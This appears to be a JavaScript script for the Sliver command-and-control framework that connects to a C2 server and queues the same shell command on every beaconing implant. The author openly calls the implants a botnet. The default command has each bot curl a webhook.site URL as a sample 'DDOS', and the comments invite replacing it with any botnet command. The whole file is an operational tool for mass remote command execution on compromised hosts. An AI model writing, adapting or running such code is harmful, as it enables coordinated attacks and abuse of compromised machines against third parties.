/*
	This is a Sliver-Script to command *ALL* the bots that are beaconing into our Sliver Command & Control Server
	Most of these commands are self-explanatory. Their syntax is the exact same as you would use in the Sliver CLI.

	Have Fun :)
	Don't do anything illegal with it (granted, I can't stop you. Sliver is a very popular tool among hackers for a reason).
*/

import { SliverClient, ParseConfigFile } from 'sliver-script'

/*
	@important - CONFIGURE THESE VARIABLES!!!!!!
*/
// If you want to target a specific beacon name, change this variable to that name. If not, leave it as "*"
const targetName = "*";
// Set the config path to your sliver client config file. The path below should be the default path for Ubuntu.
const CONFIG_PATH = "/home/ubuntu/.sliver-client/configs/ubuntu_localhost.cfg";

(async function() {
    const config = await ParseConfigFile(CONFIG_PATH)
    const client = new SliverClient(config)

    // Connects to your Sliver server
    await client.connect()
    const beacons = await client.beacons()
    
	// Loop through + interact with EACH beacon.
    beacons.forEach(async (beacon) => {
        let bot = await client.interactBeacon(beacon.ID);
	
		// Get beacon name (AKA name of the C2 server the beacon is listening for)
		let botName = beacon.Name;
		let botID = beacon.ID;

		if (targetName != "*" && targetName != botName)
		{
			// console.log(`[DEBUG] Skipping ${botID} - ${botName}. The beacon name does not match what we want.`);
			return;
		}
	
		// ⭐ Replace the following with your own botnet commands! For now, this just "DDOSes" a webhook. 
		// (DDOS in quotes because I only have like 2 sliver agents running).
		// Use await on outputPromise if you want to read it
        let outputPromise = await bot.execute("curl", ["https://webhook.site/db6016a7-b7d3-4366-9033-c7572c5a8f6d"])
    	
		console.log(`Queued! command for ${botID} - ${botName}.`);
    });

	console.log("At this stage, feel free to CTRL + C and close out of this. Remember it takes a while for the command to beacon through the botnet.");
})();
